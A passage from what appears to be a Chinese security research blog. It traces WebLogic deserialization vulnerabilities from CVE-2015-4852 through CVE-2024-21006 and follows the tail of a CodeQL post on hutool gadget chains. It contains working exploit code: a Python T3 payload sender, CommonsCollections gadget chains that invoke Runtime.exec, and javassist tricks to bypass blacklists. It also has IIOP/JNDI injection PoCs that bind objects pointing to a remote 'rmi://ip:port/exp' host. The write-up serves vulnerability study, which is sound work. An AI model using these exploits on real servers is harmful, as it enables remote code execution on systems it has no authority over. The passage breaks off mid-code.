nternal\rcn.hutool.core.convert.AbstractConverter#convert\rcn.hutool.core.convert.ConverterRegistry#convert\rcn.hutool.core.convert.ConverterRegistry#convert\rcn.hutool.core.convert.Convert#convertWithCheck\rcn.hutool.core.convert.Convert#convert\rcn.hutool.core.convert.Convert#convert\rcn.hutool.core.map.MapProxy#invoke\rcom.sun.proxy.$Proxy0#getBounds\rsun.reflect.NativeMethodAccessorImpl#invoke0\rsun.reflect.NativeMethodAccessorImpl#invoke\rsun.reflect.DelegatingMethodAccessorImpl#invoke\rjava.lang.reflect.Method#invoke\rcom.feilong.lib.beanutils.PropertyUtilsBean#invokeMethod\rcom.feilong.lib.beanutils.PropertyUtilsBean#getSimpleProperty\rcom.feilong.lib.beanutils.PropertyUtilsBean#getSimpleProperty\rcom.feilong.lib.beanutils.PropertyUtilsBean#getProperty\rcom.feilong.lib.beanutils.PropertyUtils#getProperty\rcom.feilong.core.bean.PropertyValueObtainer#getDataUseApache\rcom.feilong.core.bean.PropertyValueObtainer#obtain\rcom.feilong.core.bean.PropertyUtil#getProperty\rcom.feilong.core.util.comparator.PropertyComparator#compare\rjava.util.PriorityQueue#siftUpUsingComparator\rjava.util.PriorityQueue#siftUp\rjava.util.PriorityQueue#offer\rjava.util.PriorityQueue#add\rorg.apache.fury.serializer.collection.AbstractCollectionSerializer#readDifferentTypeElements\rorg.apache.fury.serializer.collection.AbstractCollectionSerializer#generalJavaRead\rorg.apache.fury.serializer.collection.AbstractCollectionSerializer#readElements\rorg.apache.fury.serializer.collection.CollectionSerializer#read\rorg.apache.fury.serializer.collection.CollectionSerializer#read\rorg.apache.fury.Fury#readDataInternal\rorg.apache.fury.Fury#readRef\rorg.apache.fury.Fury#deserialize\rorg.apache.fury.Fury#deserialize ","permalink":"https://zoiltin.github.io/posts/codeql%E6%9F%A5%E6%89%BEaliyunctf-jtools%E4%B8%ADhutool%E7%9A%84%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/","summary":"数据库构建 feilong\nreadme中关于安装的命令：\ngit clone https://github.com/ifeilong/feilong.git --depth 1 mvn install 根据这个写出数据库构建语句，并加上一些跳过选项：\ncodeql database create feilong-database --language=\u0026#34;java\u0026#34; --command=\u0026#34;mvn clean -DskipTests -Drat.skip=true package\u0026#34; hutool\nhutool安装要通过install.sh链接，内容如下：\n#!/bin/bash exec mvn -T 1C clean source:jar javadoc:javadoc install -Dmaven.test.skip=false -Dmaven.javadoc.skip=false 根据这个脚本内容写，把里面的Test和Doc都改成True，跳过Test和文档生成，节省时间。\ncodeql database create hutool-database --language=\u0026#34;java\u0026#34; --command=\u0026#34;mvn -T 1C clean source:jar javadoc:javadoc package -DskipTests -Drat.skip=true -Dmaven.javadoc.skip\u0026#34; feilong数据库大概5分钟就建好了，hutool可能需要十几分钟。\ncodeql不同版本可能有细微差异，要参照文档写：https://codeql.github.com/codeql-standard-libraries/java/\nGetter java.beans包下有一些操作bean的类，其中java.beans.PropertyDescriptor#getReadMethod和java.beans.PropertyDescriptor#getWriteMethod用于获取相应Getter/Setter的Method对象。根据这个写出Sink点，查找能够调用Getter的gadget：\npredicate callGetterSinks(Method method) {\rexists(MethodAccess call |\r(\rcall.getCallee().getQualifiedName().matches(\u0026#34;%getReadMethod%\u0026#34;)\r) and call.getCaller() = method\r)\r} 对于反序列化来说还需要限制方法所在类实现了序列化接口或者是静态方法：","title":"CodeQL查找AliyunCTF JTools中hutool的二次反序列化链"},{"content":"环境配置 使用WeblogicEnvironment项目搭建，地址：WeblogicEnvironment\nWeblogic Server官网下载地址：https://www.oracle.com/hk/middleware/technologies/weblogic-server-downloads.html\noracle删除了官网上所有的Weblogic Server 10.3.6.0.0的下载链接，只剩下了12.x和14.x的。不过我们可以通过url直接下载：http://download.oracle.com/otn/nt/middleware/11g/wls/1036/wls1036_generic.jar\ndocker build或者run的时候可能会内存不足，增加ulimit即可：--ulimit nofile=65535:65535\ndocker里的java版本最好和idea使用的版本一样，不然容易出现debug行号不一致的问题。\n由于centos 8 于2021年12月31日停止了源的服务，需要修改yum的源等等操作，修改Dockerfile:\nRUN cd /etc/yum.repos.d/\rRUN sed -i \u0026#39;s/mirrorlist/#mirrorlist/g\u0026#39; /etc/yum.repos.d/CentOS-*\rRUN sed -i \u0026#39;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g\u0026#39; /etc/yum.repos.d/CentOS-* 从容器里复制出lib导入idea即可开始debug，端口以为8453：\n/u01/app/oracle/middleware/modules /u01/app/oracle/middleware/wlserver\r/u01/app/oracle/middleware/coherence_3.7/lib T3反序列化 CVE-2015-4852 Weblogic 10.3.6\nJDK8u65\nT3协议部分参考：http://drops.xmd5.com/static/drops/web-13470.html\nWeblogic Server 使用T3协议进行RMI通信，请求包格式如下： 第一部分为T3协议头，后面跟着7段java序列化数据，将其中任意一部分改为恶意序列化数据即可。\n关于其中探测版本部分，我发现有时返回包会分到两个TCP数据包里发过来，所以脚本需要改一下：\ndata = sock.recv(1024) if len(data) == 4: data = data + sock.recv(1024) 数据流先进入InboundMsgAbbrev#readObject方法：\nprivate Object readObject(MsgAbbrevInputStream var1) throws IOException, ClassNotFoundException { int var2 = var1.read(); switch (var2) { case 0: return (new ServerChannelInputStream(var1)).readObject(); case 1: return var1.readASCII(); default: throw new StreamCorruptedException(\u0026#34;Unknown typecode: \u0026#39;\u0026#34; + var2 + \u0026#34;\u0026#39;\u0026#34;); } } 然后进入ServerChannelInputStream#readObject方法，这个类实现了resolveClass方法：\nprotected Class resolveClass(ObjectStreamClass var1) throws ClassNotFoundException, IOException { Class var2 = super.resolveClass(var1); if (var2 == null) { throw new ClassNotFoundException(\u0026#34;super.resolveClass returns null.\u0026#34;); } else { ObjectStreamClass var3 = ObjectStreamClass.lookup(var2); if (var3 != null \u0026amp;\u0026amp; var3.getSerialVersionUID() != var1.getSerialVersionUID()) { throw new ClassNotFoundException(\u0026#34;different serialVersionUID. local: \u0026#34; + var3.getSerialVersionUID() + \u0026#34; remote: \u0026#34; + var1.getSerialVersionUID()); } else { return var2; } } } 不过这个版本没有过滤，不影响。ServerChannelInputStream没有重写readObject，所以直接进入java.io.ObjectInputStream#readObject方法。畅通无阻。\n10.3.6版本带有cc3.2.0的依赖，可以打cc链，exp如下：\nimport socket import struct import re import binascii def get_payload(path): with open(path, \u0026#34;rb\u0026#34;) as f: return f.read() def exp(host, port, payload): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((host, port)) handshake = \u0026#34;t3 12.2.3\\nAS:255\\nHL:19\\nMS:10000000\\n\\n\u0026#34;.encode() sock.sendall(handshake) data = sock.recv(1024) if len(data) == 4: data = data + sock.recv(1024) pattern = re.compile(r\u0026#34;HELO:(.*).false\u0026#34;) version = re.findall(pattern, data.decode()) if len(version) == 0: print(\u0026#34;Not Weblogic\u0026#34;) return print(\u0026#34;Weblogic {}\u0026#34;.format(version[0])) data_len = binascii.a2b_hex(b\u0026#34;00000000\u0026#34;) #数据包长度，先占位，后面会根据实际情况重新 t3header = binascii.a2b_hex(b\u0026#34;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006\u0026#34;) #t3协议头 flag = binascii.a2b_hex(b\u0026#34;fe010000\u0026#34;) #反序列化数据标志 payload = data_len + t3header + flag + payload payload = struct.pack(\u0026#39;\u0026gt;I\u0026#39;, len(payload)) + payload[4:] #重新计算数据包长度 sock.send(payload) if __name__ == \u0026#34;__main__\u0026#34;: host = \u0026#34;\u0026#34; port = 7001 payload = get_payload(\u0026#34;./ser.bin\u0026#34;) exp(host, port, payload) 生成的恶意序列化放在./ser.bin。生成代码：\npublic class Exp { public static void main(String[] args) throws Exception { String command = \u0026#34;\u0026#34;; final String[] execArgs = new String[] { command }; final Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, execArgs), new ConstantTransformer(1) }; Transformer transformerChain = new ChainedTransformer(transformers); final Map innerMap = new HashMap(); final Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \u0026#34;foo\u0026#34;); HashSet map = new HashSet(1); map.add(\u0026#34;foo\u0026#34;); HashMap innimpl = (HashMap) getFieldValue(map, \u0026#34;map\u0026#34;); Object[] array = (Object[]) getFieldValue(innimpl, \u0026#34;table\u0026#34;); Object node = array[0]; if(node == null){ node = array[1]; } setFieldValue(node, \u0026#34;key\u0026#34;, entry); serToFile(map); } } CVE-2016-0638 (readExternal绕过) Weblogic 10.3.6\nJDK8u65\nCVE-2015-4852的补丁就是在resolveclass里添加类黑名单检测，绕过思路就是二次反序列化。\njava.io.ObjectInputStream#readObject会调用readOrdinaryObject方法反序列化为Object，其中如果可拓展会调用readExternalData方法：\nprivate Object readOrdinaryObject(boolean unshared) throws IOException { if (bin.readByte() != TC_OBJECT) { throw new InternalError(); } ObjectStreamClass desc = readClassDesc(false); desc.checkDeserialize(); ................ if (desc.isExternalizable()) { readExternalData((Externalizable) obj, desc); } else { readSerialData(obj, desc); } ................. return obj; } 最终会调用这个Externalizable类的readExternal方法。\nStreamMessageImpl类的readExternal方法代码如下：\npublic void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException { super.readExternal(var1); byte var2 = var1.readByte(); byte var3 = (byte)(var2 \u0026amp; 127); if (var3 \u0026gt;= 1 \u0026amp;\u0026amp; var3 \u0026lt;= 3) { switch (var3) { case 1: this.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)var1); BufferInputStream var4 = this.payload.getInputStream(); ObjectInputStream var5 = new ObjectInputStream(var4); this.setBodyWritable(true); this.setPropertiesWritable(true); try { while(true) { this.writeObject(var5.readObject()); ................ } 可以调用原生的readObject方法，绕过黑名单。\n这个类需要自己生成：\ncd WL_HOME/server/lib java -jar ../../../modules/com.bea.core.jarbuilder_X.X.X.X.jar 生成的wlfullclient.jar复制出来导入idea。\n对应的StreamMessageImpl类也有一个writeExternal方法，不过不可控，用javassist改一下，然后序列化时会将CC链的序列化数据写入External数据部分，poc代码如下：\npublic class Exp { public static void main(String[] args) throws Exception { String command = \u0026#34;\u0026#34;; final String[] execArgs = new String[] { command }; final Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, execArgs), new ConstantTransformer(1) }; Transformer transformerChain = new ChainedTransformer(transformers); final Map innerMap = new HashMap(); final Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \u0026#34;foo\u0026#34;); HashSet map = new HashSet(1); map.add(\u0026#34;foo\u0026#34;); HashMap innimpl = (HashMap) getFieldValue(map, \u0026#34;map\u0026#34;); Object[] array = (Object[]) getFieldValue(innimpl, \u0026#34;table\u0026#34;); Object node = array[0]; if(node == null){ node = array[1]; } setFieldValue(node, \u0026#34;key\u0026#34;, entry); byte[] data = ser(map); String base64Code = Base64.getEncoder().encodeToString(data); int length = data.length; ClassPool pool = ClassPool.getDefault(); CtClass ctClass0 = pool.get(\u0026#34;weblogic.jms.common.StreamMessageImpl\u0026#34;); CtMethod writeReplace = ctClass0.getDeclaredMethod(\u0026#34;writeExternal\u0026#34;); String code = \u0026#34;{\\n\u0026#34; + \u0026#34;System.out.println(1);\\n\u0026#34; + \u0026#34;super.writeExternal($1);\\n\u0026#34; + \u0026#34;java.io.ObjectOutput out = (java.io.ObjectOutput) $1;\\n\u0026#34; + \u0026#34;out.writeByte(1);\\n\u0026#34; + \u0026#34;\\n\u0026#34; + \u0026#34;int length = \u0026#34; + length + \u0026#34;;\\n\u0026#34; + \u0026#34;String base64Code = \\\u0026#34;\u0026#34;+ base64Code + \u0026#34;\\\u0026#34;;\\n\u0026#34; + \u0026#34;byte[] buffer = java.util.Base64.getDecoder().decode(base64Code);\\n\u0026#34; + \u0026#34;\\n\u0026#34; + \u0026#34;out.writeInt(length);\\n\u0026#34; + \u0026#34;out.write(buffer);}\u0026#34;; writeReplace.setBody(code); ctClass0.detach(); ctClass0.toClass(); StreamMessageImpl streamMessage = new StreamMessageImpl(); serToFile(streamMessage); } } 然后再用python脚本发送即可。\nCVE-2016-3510 (readResolve绕过) Weblogic 10.3.6\nJDK8u65\nCVE-2015-4852的另一种绕过。\n还是之前分析的ObjectInputStream#readOrdinaryObject方法：\nprivate Object readOrdinaryObject(boolean unshared) throws IOException { ............. if (desc.isExternalizable()) { readExternalData((Externalizable) obj, desc); } else { readSerialData(obj, desc); } handles.finish(passHandle); if (obj != null \u0026amp;\u0026amp; handles.lookupException(passHandle) == null \u0026amp;\u0026amp; desc.hasReadResolveMethod()) { Object rep = desc.invokeReadResolve(obj); if (unshared \u0026amp;\u0026amp; rep.getClass().isArray()) { rep = cloneArray(rep); } if (rep != obj) { handles.setObject(passHandle, obj = rep); } } return obj; } 在检查完isExternalizable后会再检查是否具有readResolve方法，有的话就调用。\nweblogic.corba.utils.MarshalledObject的readResolve的方法可以进行二次反序列化：\npublic Object readResolve() throws IOException, ClassNotFoundException, ObjectStreamException { if (this.objBytes == null) { return null; } else { ByteArrayInputStream var1 = new ByteArrayInputStream(this.objBytes); ObjectInputStream var2 = new ObjectInputStream(var1); Object var3 = var2.readObject(); var2.close(); return var3; } } 这个类也在wlfullclient.jar里，需要自己生成。\npoc代码如下：\npublic class Exp { public static void main(String[] args) throws Exception { String command = \u0026#34;\u0026#34;; final String[] execArgs = new String[] { command }; final Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, execArgs), new ConstantTransformer(1) }; Transformer transformerChain = new ChainedTransformer(transformers); final Map innerMap = new HashMap(); final Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \u0026#34;foo\u0026#34;); HashSet map = new HashSet(1); map.add(\u0026#34;foo\u0026#34;); HashMap innimpl = (HashMap) getFieldValue(map, \u0026#34;map\u0026#34;); Object[] array = (Object[]) getFieldValue(innimpl, \u0026#34;table\u0026#34;); Object node = array[0]; if(node == null){ node = array[1]; } setFieldValue(node, \u0026#34;key\u0026#34;, entry); MarshalledObject marshalledObject = new MarshalledObject(map); serToFile(marshalledObject); } } CVE-2017-3248 Weblogic 10.3.6\nJDK8u65\nJRMP协议也可以触发readObject。\n使用ysoserial的JRMPListener即可。\n补丁添加的黑名单.\nCVE-2018-2628 Weblogic 10.3.6\nJDK8u65\nJRMP的UnicastRef类有readExternal方法，可以直接用这个类来反序列化绕过黑名单检测。\npublic void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException { this.ref = LiveRef.read(var1, false); } 最终也会触发TCPEndpoint连接，触发JRMP反序列化。\npoc:\npublic class Exp { public static void main(String[] args) throws Exception { String host = \u0026#34;ip\u0026#34;; int port = ; ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(host, port); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); serToFile(ref); } } ip和port指向ysoserial的JRMPListener监听的地址。\nIIOP协议反序列化 Weblogic IIOP协议默认开启，跟T3协议一起监听在7001端口\nCommon Object Request Broker Architecture（公共对象请求代理体系结构）是由OMG(Object Management Group)组织制定的一种标准分布式对象结构。使用平台无关的语言IDL（interface definition language）描述连接到远程对象的接口，然后将其映射到制定的语言实现。 一般来说CORBA将其结构分为三部分：\nnaming service client side servant side GIOP全称（General Inter-ORB Protocol）通用对象请求协议，其功能简单来说就是CORBA用来进行数据传输的协议。GIOP针对不同的通信层有不同的具体实现，而针对于TCP/IP层，其实现名为IIOP（Internet Inter-ORB Protocol）。所以说通过TCP协议传输的GIOP数据可以称为IIOP。\nRMI-IIOP出现以前，只有RMI和CORBA两种选择来进行分布式程序设计，二者之间不能协作。但是现在有了RMI-IIOP，稍微修改代码即可实现RMI客户端使用IIOP协议操作服务端CORBA对象，这样综合了RMI的简单性和CORBA的多语言性兼容性，RMI-IIOP克服了RMI只能用于Java的缺点和CORBA的复杂性。\n网路问题 IIOP在bind时会绑定在0.0.0.0上，默认只能带本地。\n可以尝试修改IIOP的部分实现代码。我这里用javassist修改了weblogic.iiop.IOPProfile#read，强制改为指定的ip。\nString ip = \u0026#34;\u0026#34;; String port = \u0026#34;7001\u0026#34;; ClassPool pool = ClassPool.getDefault(); CtClass IOPProfileCtClass = pool.get(\u0026#34;weblogic.iiop.IOPProfile\u0026#34;); CtMethod read = IOPProfileCtClass.getDeclaredMethod(\u0026#34;read\u0026#34;); String code = \u0026#34;this.host = \\\u0026#34;\u0026#34; + ip + \u0026#34;\\\u0026#34;;\u0026#34;; read.insertAfter(code); IOPProfileCtClass.detach(); IOPProfileCtClass.toClass(); CVE-2020-2551 Weblogic 10.3.6\nJDK8u65\n与JRMP类似，IIOP协议在不同组件之间通信是通过序列化/反序列化。\nJtaTransactionManager类本身不在黑名单里了，但其父类AbstractPlatformTransactionManager在黑名单里，T3协议使用resolveClass过滤，这个方法也会检测父类，可以过滤JtaTransactionManager类，而IIOP协议不使用resolveClass，所以不会过滤，所以无法根据父类将其过滤。\nJtaTransactionManager在反序列化时会通过JNDI去加载对象。\npoc如下：\npublic class Exp { public static void main(String[] args) throws Exception { String ip = \u0026#34;\u0026#34;; String port = \u0026#34;7001\u0026#34;; ClassPool pool = ClassPool.getDefault(); CtClass IOPProfileCtClass = pool.get(\u0026#34;weblogic.iiop.IOPProfile\u0026#34;); CtMethod read = IOPProfileCtClass.getDeclaredMethod(\u0026#34;read\u0026#34;); String code = \u0026#34;this.host = \\\u0026#34;\u0026#34; + ip + \u0026#34;\\\u0026#34;;\u0026#34;; read.insertAfter(code); IOPProfileCtClass.detach(); IOPProfileCtClass.toClass(); try { Hashtable\u0026lt;String, String\u0026gt; env = new Hashtable\u0026lt;String, String\u0026gt;(); env.put(\u0026#34;java.naming.factory.initial\u0026#34;, \u0026#34;weblogic.jndi.WLInitialContextFactory\u0026#34;); env.put(\u0026#34;java.naming.provider.url\u0026#34;, String.format(\u0026#34;iiop://%s:%s\u0026#34;, ip, port)); Context context = new InitialContext(env); // get Object to Deserialize JtaTransactionManager jtaTransactionManager = new JtaTransactionManager(); jtaTransactionManager.setUserTransactionName(\u0026#34;rmi://ip:port/Exploit\u0026#34;); Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(\u0026#34;pwnedasd\u0026#34;, jtaTransactionManager), Remote.class); System.out.println(\u0026#34;start\u0026#34;); context.bind(\u0026#34;hello\u0026#34;, remote); } catch (Exception e){ e.printStackTrace(); } } } CVE-2023-21839 Weblogic 12.2.1.4\nJDK8u65\n12.x可以直接从官网下载，将/u01/app/oracle/middleware/wlserver下的所有导入idea。\n也需要导入wlfullclient.jar，与10.3.6的生成方式不同。\ncd /u01/app/oracle/middleware/wlserver/server/lib /java/bin/java -jar ../../modules/com.bea.core.jarbuilder.jar 当客户端向服务器lookup对象时，服务器会调用weblogic.corba.cos.naming.NamingContextImpl#resolveObject方法。\nprivate java.lang.Object resolveObject(String name) throws NamingException { if (name.equals(\u0026#34;\u0026#34;)) { return this; } else { java.lang.Object o = this.getContext().lookup(name); ......................... 此时的context为weblogic.jndi.internal.WLContextImpl，如果绑定的对象不是NamingNode则会调用getObjectInstance:\nprotected Object resolveObject(String name, Object obj, int mode, Hashtable env) throws NamingException { Object resolved = obj; if (obj != null) { try { if (obj instanceof NamingNode) { resolved = ((NamingNode)obj).getContext(env); } else if (mode != 0 \u0026amp;\u0026amp; mode \u0026gt;= 0) { resolved = WLNamingManager.getObjectInstance(obj, new CompositeName(name), (Context)null, env); resolved = this.makeTransportable(resolved, name, env); } .............. 如果绑定的对象是OpaqueReference则调用其getReference方法。\n} else if (boundObject instanceof OpaqueReference) { boundObject = ((OpaqueReference)boundObject).getReferent(name, ctx); weblogic.deployment.jms.ForeignOpaqueReference是OpaqueReference的一个实现类，其getReference方法可以触发原生JNDI lookup，关键代码如下：\npublic Object getReferent(Name name, Context ctx) throws NamingException { AbstractSubject originalSubject = SubjectManager.getSubjectManager().getCurrentSubject(KERNEL_ID); InitialContext context; if (this.jndiEnvironment == null) { context = new InitialContext(); } else { if (this.jndiEnvironment.get(\u0026#34;java.naming.factory.initial\u0026#34;) == null) { this.jndiEnvironment.put(\u0026#34;java.naming.factory.initial\u0026#34;, \u0026#34;weblogic.jndi.WLInitialContextFactory\u0026#34;); } context = new InitialContext(this.jndiEnvironment); } ..................... Object retVal; try { if (this.jndiEnvironment != null \u0026amp;\u0026amp; AQJMS_ICF.equals(this.jndiEnvironment.get(\u0026#34;java.naming.factory.initial\u0026#34;)) \u0026amp;\u0026amp; this.remoteJNDIName != null \u0026amp;\u0026amp; (this.remoteJNDIName.startsWith(AQJMS_QPREFIX) || this.remoteJNDIName.startsWith(AQJMS_TPREFIX))) { synchronized(this) { if (this.cachedReferent == null) { this.cachedReferent = context.lookup(evalMacros(this.remoteJNDIName)); } } retVal = this.cachedReferent; } else { retVal = context.lookup(evalMacros(this.remoteJNDIName)); } } finally { SubjectManager.getSubjectManager().popSubject(KERNEL_ID); context.close(); } ................ } 当lookup一个ForeignOpaqueReference对象时会触发jndi lookup.\nremoteJNDIName属性需要反射写入，poc：\npublic class Exp { public static void main(String[] args) throws Exception { String ip = \u0026#34;\u0026#34;; String port = \u0026#34;7001\u0026#34;; ClassPool pool = ClassPool.getDefault(); CtClass IOPProfileCtClass = pool.get(\u0026#34;weblogic.iiop.ior.IOPProfile\u0026#34;); CtMethod read = IOPProfileCtClass.getDeclaredMethod(\u0026#34;read\u0026#34;); String code = \u0026#34;this.host = \\\u0026#34;\u0026#34; + ip + \u0026#34;\\\u0026#34;;\u0026#34;; read.insertAfter(code); IOPProfileCtClass.detach(); IOPProfileCtClass.toClass(); Hashtable\u0026lt;String, String\u0026gt; env = new Hashtable\u0026lt;String, String\u0026gt;(); env.put(\u0026#34;java.naming.factory.initial\u0026#34;, \u0026#34;weblogic.jndi.WLInitialContextFactory\u0026#34;); env.put(\u0026#34;java.naming.provider.url\u0026#34;, String.format(\u0026#34;iiop://%s:%s\u0026#34;, ip, port)); Context context = new InitialContext(env); ForeignOpaqueReference foreignOpaqueReference = new ForeignOpaqueReference(); setFieldValue(foreignOpaqueReference, \u0026#34;remoteJNDIName\u0026#34;, \u0026#34;rmi://ip:port/exp\u0026#34;); System.out.println(\u0026#34;start\u0026#34;); context.rebind(\u0026#34;helloasd\u0026#34;, foreignOpaqueReference); context.lookup(\u0026#34;helloasd\u0026#34;); } } 直接将ForeignOpaqueReferencerebind，接着lookup即可，还是需要用javassist修改函数才能打远程。不过12.2.1.4版本中类名从weblogic.iiop.IOPProfile改为了weblogic.iiop.ior.IOPProfile.\nCVE-2024-20931 Weblogic 12.2.1.4\nJDK8u65\n属于CVE-2023-21839的绕过，补丁添加了两个过滤：\n如果jndiEnvironment中providerURL不为null会检查签名 限制了JNDI的协议类型 之前打CVE-2023-21839时jndiEnv为null，这次需要用jndiEnv的java.naming.factory.initial属性指定本地工厂类。\n服务器在创建上下文时会调用这个工厂类的getInitialContext方法。\n堆栈如下：\njavax.naming.spi.InitialContextFactory#getInitialContext\rjavax.naming.spi.NamingManager#getInitialContext\rjavax.naming.InitialContext#getDefaultInitCtx\rjavax.naming.InitialContext#init\rjavax.naming.InitialContext#\u0026lt;init\u0026gt;\rweblogic.deployment.jms.ForeignOpaqueReference#getReferent\rweblogic.jndi.internal.WLNamingManager#getObjectInstance\rweblogic.jndi.internal.BasicNamingNode#resolveObject\rweblogic.jndi.internal.BasicNamingNode#resolveObject\rweblogic.jndi.internal.BasicNamingNode#lookupSharable\rweblogic.jndi.internal.PartitionHandler#lookupSharable\rweblogic.jndi.internal.ServerNamingNode#lookup\rweblogic.jndi.internal.RootNamingNode#lookup\rweblogic.jndi.internal.WLEventContextImpl#lookup\rweblogic.jndi.internal.WLContextImpl#lookup\rjavax.naming.InitialContext#lookup\rweblogic.corba.cos.naming.NamingContextImpl#resolveObject AQjmsInitialContextFactory这个工厂类的getInitialContext方法会调用根据参数dataSource进行原生jndi lookup。\n用poc能打通，不过我这边找不到这个类在哪，所以不知道具体触发jndi的代码是什么。\n反射写入jndiEnv即可。\nHashtable jndiEnv = new Hashtable(); jndiEnv.put(\u0026#34;java.naming.factory.initial\u0026#34;, \u0026#34;oracle.jms.AQjmsInitialContextFactory\u0026#34;); jndiEnv.put(\u0026#34;datasource\u0026#34;, \u0026#34;rmi://ip:port/exp\u0026#34;); setFieldValue(foreignOpaqueReference, \u0026#34;jndiEnvironment\u0026#34;, jndiEnv); CVE-2024-21006 Weblogic 12.2.1.4\nJDK8u65\n漏洞的最终利用方式和CVE-2023-21839、CVE-2024-20931一致，都是利用 IIOP -\u0026gt; JNDI 去造成远程代码执行，不过在整个触发的过程中有所不同。\n从CVE-2024-20931的调用堆栈来看，通过了weblogic.jndi.internal.BasicNamingNode#lookupSharable并进入了if代码块，代码如下：\nprotected Object lookupSharable(String name, Hashtable env) throws NamingException, RemoteException { String prefix = this.getPrefix(name); String restOfName = this.getRest(name); Object object = this.lookupHere(prefix, env, restOfName); if (restOfName.length() == 0) { if (NamingDebugLogger.isDebugEnabled()) { NamingDebugLogger.debug(\u0026#34;+++ lookupInSharable(\u0026#34; + name + \u0026#34;, \u0026#34; + object.getClass().getName() + \u0026#34;) succeeded\u0026#34;); } return this.resolveObject(prefix, object, env); } else { try { if (object instanceof BasicNamingNode) { object = ((BasicNamingNode)object).lookupSharable(restOfName, env); } else { object = this.getContinuationCtx(object, prefix, restOfName, env).lookup(restOfName); } } catch (NamingException var7) { throw this.prependResolvedNameToException(prefix, var7); } return this.makeTransportable(object, restOfName, env); } } 如果restOfName.length() == 0为真，进入else分支，让object不为BasicNamingNode类型会调用getContinuationCtx\n有一个补丁在getContinuationCtx里，限制了通过HTTP codebase加载远程类。后面会调用NamingManager#getContinuationContext：\npublic static Context getContinuationContext(CannotProceedException cpe) throws NamingException { Hashtable\u0026lt;Object,Object\u0026gt; env = (Hashtable\u0026lt;Object,Object\u0026gt;)cpe.getEnvironment(); if (env == null) { env = new Hashtable\u0026lt;\u0026gt;(7); } else { // Make a (shallow) copy of the environment. env = (Hashtable\u0026lt;Object,Object\u0026gt;)env.clone(); } env.put(CPE, cpe); ContinuationContext cctx = new ContinuationContext(cpe, env); return cctx.getTargetContext(); } 最终会调用到javax.naming.spi.NamingManager#getObjectInstance方法，这里就是原生jndi lookup调用本地工厂类的地方：\nfactory = getObjectFactoryFromReference(ref, f); if (factory != null) { return factory.getObjectInstance(ref, name, nameCtx, environment); } weblogic.application.naming.MessageDestinationObjectFactory类实现了ObjectFactory接口，可以作为工厂类，其getObjectInstance方法可以触发原生jndi lookup，相当于二次jndi注入绕过限制。\npublic Object getObjectInstance(Object obj, Name name, Context ctx, Hashtable\u0026lt;?, ?\u0026gt; env) throws NamingException { if (!(obj instanceof MessageDestinationReference)) { throw new AssertionError(\u0026#34;ObjectFactory should have been referenced only from EnvReference\u0026#34;); } else { return ((MessageDestinationReference)obj).lookupMessageDestination(); } } public Object lookupMessageDestination() throws NamingException { InitialContext ic; if (this.initialContextFactory == null) { ic = new InitialContext(); } else { Hashtable\u0026lt;String, String\u0026gt; env = new Hashtable(); env.put(\u0026#34;java.naming.factory.initial\u0026#34;, this.initialContextFactory); if (null != this.providerURL) { env.put(\u0026#34;java.naming.provider.url\u0026#34;, this.providerURL); } ic = new InitialContext(env); } return ic.lookup(this.jndiName); } 需要bind一个MessageDestinationReference对象。其构造方法允许指定jndiName：\npublic MessageDestinationReference(Environment env, MessageDestinationRefBean msgDest, String jndiName, String providerURL, String initialContextFactory) throws EnvironmentException { super(env, msgDest.getMessageDestinationType(), \u0026#34;weblogic.application.naming.MessageDestinationObjectFactory\u0026#34;); this.jndiName = jndiName; this.providerURL = providerURL; this.initialContextFactory = initialContextFactory; } 似乎需要在weblogic运行时才能msgDest.getMessageDestinationType()，本地会报错，用javassist改一下就可以了：\nCtClass MessageDestinationReferenceCtClass = pool.get(\u0026#34;weblogic.application.naming.MessageDestinationReference\u0026#34;); CtConstructor[] cons = MessageDestinationReferenceCtClass.getDeclaredConstructors(); CtConstructor MessageDestinationReferenceCon = null; for(CtConstructor con : cons){ if (con.getParameterTypes()[0].getName().equals(\u0026#34;weblogic.application.naming.Environment\u0026#34;)){ MessageDestinationReferenceCon = con; break; } } if (MessageDestinationReferenceCon == null){ System.out.println(\u0026#34;con not found\u0026#34;); System.exit(0); } MessageDestinationReferenceCon.setBody(\u0026#34;{\\n\u0026#34; + \u0026#34; super($1, \\\u0026#34;java.lang.Object\\\u0026#34;, 